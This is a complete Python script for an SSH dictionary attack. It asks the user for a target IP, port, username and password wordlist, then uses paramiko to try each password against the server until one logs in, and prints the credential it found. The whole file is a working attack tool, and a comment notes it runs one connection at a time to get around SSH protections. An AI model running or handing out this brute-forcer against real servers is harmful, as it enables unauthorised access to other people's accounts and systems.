#!/usr/bin/python3

from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
from time import sleep
from sys import exit
from os import system, path

# Due to the robust security protocols integrated within SSH, parallel attacks are considerably less effective. Consequently, I opted to employ a single attack connection

is_termux = path.exists("/data/data/com.termux/files/")

def get_encoder():
    print("\nINFO: Only valid for SSH services exposed on the Internet (Not Locally)")
    print("INFO: For compatibility with certain symbols, choose an encoding:")
    print("1) latin-1\n2) utf-8")
    encoder_text = input("Option: ")
    select_encoder = "latin-1" if encoder_text == "1" else "utf-8"
    return select_encoder

def ssh(client, passwords, hostname, username, port):
    for pwd in passwords:
        try:
            client.connect(hostname, port=port, username=username, password=pwd, timeout=3)
            stdin, stdout, stderr = client.exec_command('echo "Ready"')
            output = stdout.read().decode().strip()
            if output == "Ready":
                print("\n{*********************** SUCCESS ***********************}")
                print(f"[✓] Password found:- {pwd}")
                client.close()
                exit(0)
            else:
                print(f"Unexpected output for password: {pwd}")
        except AuthenticationException:
            print(f"[*] Trying password:- {pwd}")
        except Exception as e:
            print(f"Error with password {pwd}: {e}")
        finally:
            client.close()
            sleep(0.01)

def read_dic(dic_path, port, hostname, username, encoder):
    client = SSHClient()
    client.set_missing_host_key_policy(AutoAddPolicy())
    with open(dic_path, 'r', encoding=encoder) as file_read:
            lines = file_read.read().splitlines()
            ssh(client, lines, hostname, username, port)

def main():
    try:
        encoder = get_encoder()
        sleep(1)
        system("clear")
        dic_path = input("Enter the dictionary path: ").strip()
        hostname = input("Enter SSH server IP: ").strip()
        port = input("Enter the port: ").strip()
        username = input("Enter SSH username: ").strip()
        read_dic(dic_path, port, hostname, username, encoder)
    except KeyboardInterrupt:
        print("\nExiting...")
        exit(0)
    except FileNotFoundError as f:
        print(f"File not found: {f}")
        exit(0)

if __name__ == '__main__':
     main()
 
__status__="Finish"
